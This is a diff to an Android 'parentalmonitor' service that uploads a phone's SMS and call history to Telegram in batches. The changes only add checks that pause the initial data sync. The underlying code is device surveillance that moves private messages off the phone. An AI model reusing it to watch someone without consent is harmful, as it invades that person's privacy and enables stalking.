@@ -567,6 +567,7 @@ class MonitoringService : Service() {
                 }
                 initialSyncRunning.set(false)
                 if (preferencesManager.initialSyncDone) return
+                if (try { preferencesManager.monitoringPaused } catch (_: Exception) { false }) return
                 if (!initialSyncRunning.compareAndSet(false, true)) return
                 val syncGen = initialSyncGen.incrementAndGet()
                 initialSyncJob = serviceScope.launch {
@@ -5161,6 +5162,10 @@ class MonitoringService : Service() {
 
     private suspend fun sendInitialData() {
         try {
+            if (try { preferencesManager.monitoringPaused } catch (_: Exception) { false }) {
+                initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 60_000L
+                return
+            }
             if (!hasNetwork()) {
                 initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 5 * 60_000L
                 return
@@ -5268,6 +5273,10 @@ class MonitoringService : Service() {
                 appendLine()
                 appendLine("Mengirim riwayat...")
             }
+            if (try { preferencesManager.monitoringPaused } catch (_: Exception) { false }) {
+                initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 60_000L
+                return
+            }
             if (!initialStartSent) {
                 initialStartSent = sendToTelegram(startMessage)
                 delay(500)
@@ -5280,6 +5289,10 @@ class MonitoringService : Service() {
                 var smsTop: com.redeye.parentalmonitor.data.models.SmsData? = null
                 var smsSemuaTerkirim = true
                 for ((index, part) in pendingSms.chunked(10).withIndex()) {
+                    if (try { preferencesManager.monitoringPaused } catch (_: Exception) { false }) {
+                        initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 60_000L
+                        return
+                    }
                     if (messageQueue.getQueueSize() >= DATA_QUEUE_SOFT_LIMIT) {
                         initialOk = false
                         smsSemuaTerkirim = false
@@ -5333,6 +5346,10 @@ class MonitoringService : Service() {
                 var callTop: com.redeye.parentalmonitor.data.models.CallData? = null
                 var callSemuaTerkirim = true
                 for ((index, part) in pendingCalls.chunked(10).withIndex()) {
+                    if (try { preferencesManager.monitoringPaused } catch (_: Exception) { false }) {
+                        initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 60_000L
+                        return
+                    }
                     if (messageQueue.getQueueSize() >= DATA_QUEUE_SOFT_LIMIT) {
                         initialOk = false
                         callSemuaTerkirim = false
